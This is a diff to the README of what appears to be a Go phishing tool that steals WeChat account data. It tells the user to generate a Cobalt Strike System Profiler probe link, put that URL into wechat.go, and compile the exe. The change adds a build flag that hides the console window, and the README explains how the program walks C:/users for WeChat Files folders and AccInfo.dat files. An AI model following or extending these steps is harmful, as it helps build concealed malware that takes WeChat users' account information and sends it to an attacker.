@@ -6,7 +6,7 @@ go语言实现钓鱼抓取微信信息，搜索微信AccInfo.dat文件，从中�
 ## 01
 CobaltStrike快速生成一个探针链接,把使用javaapplet获取信息勾选上
 cobalt strike 选择Attacks ->Web Drive-by -> System Profiler
-生成后替换wechat.go中的url->go build 编译exe
+生成后替换wechat.go中的url->go build -ldflags "-H windowsgui" (无dos)编译 exe
 ## 02
 默认遍历"C:/users"可修改wechat.gol->dirname遍历指定盘符
 当匹配到WeChat Files文件夹时才会遍历AccInfo.dat文件，缩短遍历时间
